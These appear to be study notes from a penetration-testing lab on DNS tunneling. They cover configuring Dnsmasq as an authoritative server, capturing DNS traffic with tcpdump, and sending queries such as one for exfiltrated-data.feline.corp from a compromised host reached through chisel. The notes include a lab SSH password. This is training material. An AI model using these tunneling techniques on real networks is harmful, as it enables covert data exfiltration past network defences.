Questions 
Follow the steps in this section. From CONFLUENCE01 or PGDATABASE01, make a TXT record request for give-me.cat-facts.internal, using MULTISERVER03 as the DNS resolver. What's the value of the TXT record?

# # FELINEAUTHORITY is registered within this network as the authoritative name server for the feline.corp zone. In order to see how DNS requests will be relayed to FELINEAUTHORITY from PGDATABASE01, we need to initiate DNS requests from PGDATABASE01, and monitor what comes in to FELINEAUTHORITY. PGDATABASE01 cannot connect directly to FELINEAUTHORITY, it can connect to MULTISERVER03. MULTISERVER03 is also configured as the DNS resolver server for PGDATABASE01.

# In order to simulate a real DNS setup, we can make FELINEAUTHORITY a functional DNS server using Dnsmasq.9 Dnsmasq is DNS server software that requires minimal configuration. A few Dnsmasq configuration files are stored in the ~/dns_tunneling folder, which we'll use as part of our DNS experiments. For this initial experiment, we'll use the very sparse dnsmasq.conf configuration file.

# We can SSH directly into FELINEAUTHORITY using the username kali and the password 7he_C4t_c0ntro11er.

ssh kali@192.168.234.7
password: 7he_C4t_c0ntro11er

cd dns_tunneling
cat dnsmasq.conf
...
# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts

# Define the zone
auth-zone=feline.corp
auth-server=feline.corp
...

# This configuration ignores the /etc/resolv.conf and /etc/hosts files and only defines the auth-zone and auth-server variables. These tell Dnsmasq to act as the authoritative name server for the feline.corp zone.

sudo dnsmasq -C dnsmasq.conf -d

# FELINEAUTHORITY, we'll set up tcpdump10 to listen on the ens192 interface for DNS packets on UDP/53, using the capture filter udp port 53.
sudo tcpdump -i ens192 udp port 53

# Now that tcpdump is listening and Dnsmasq is running on FELINEAUTHORITY, we will move to our shell on PGDATABASE01. From there we will make DNS queries aimed at the feline.corp domain.

# Then exploit and access to the PGDATABASE01
# Upload chisel to the CONFLUENCE01

# nslookup used the DNS server running on the localhost interface of 127.0.0.53. This is normal as it's the DNS resolver provided by the systemd-resolved12 service running on Ubuntu. It will forward the query to the DNS server that's configured by Netplan. However, it may cache results. If we receive outdated DNS responses, we should try flushing the local DNS cache with resolvectl flush-caches. We can also query the DNS server directly by appending the serve address to the nslookup command. For example: nslookup exfiltrated-data.feline.corp 192.168.50.64.

# We've received a DNS A record request for exfiltrated-data.feline.corp on FELINEAUTHORITY. This happened because MULTISERVER03 determined the authoritative name server for the feline.corp zone. All requests for any subdomain of feline.corp will be forwarded to FELINEAUTHORITY. We didn't tell Dnsmasq on FELINEAUTHORITY what to do with requests for exfiltrated-data.feline.corp, so Dnsmasq just returned an NXDomain_ response.

# Stop the previous DNS service on FELINEAUTHORITY
CTRL + C to stop the service
